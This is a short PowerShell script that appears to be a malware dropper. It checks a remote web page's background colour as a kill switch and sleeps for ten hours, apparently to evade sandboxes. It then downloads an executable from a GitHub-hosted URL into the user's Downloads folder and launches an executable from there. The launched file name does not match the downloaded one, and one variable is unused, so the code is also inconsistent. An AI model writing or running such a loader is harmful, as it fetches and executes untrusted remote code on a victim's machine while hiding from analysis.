$urls = @(
    "https://github.com/webntdev/webntdev.github.io/raw/main/application/Captura.exe"
)

$filePath = Join-Path -Path $env:USERPROFILE -ChildPath "Downloads\wheiu.bz"
$url = "https://backgroundcolor.pages.dev"
$response = Invoke-WebRequest -Uri $url
$backgroundColor = $response.ParsedHtml.getElementsByTagName("body").Style.backgroundColor

if ($backgroundColor -eq "blue") {
    exit
}

Start-Sleep -Seconds 36000

$downloadDir = [System.Environment]::ExpandEnvironmentVariables('%USERPROFILE%\Downloads')
if (-not (Test-Path -Path $downloadDir)) {
    New-Item -ItemType Directory -Path $downloadDir
}

foreach ($url in $urls) {
    $fileName = [System.IO.Path]::GetFileName($url)
    $destinationPath = Join-Path -Path $downloadDir -ChildPath $fileName
    Invoke-WebRequest -Uri $url -OutFile $destinationPath
}

$exePath = Join-Path -Path $downloadDir -ChildPath "WindowsFormsApp2.exe"
Start-Process -FilePath $exePath
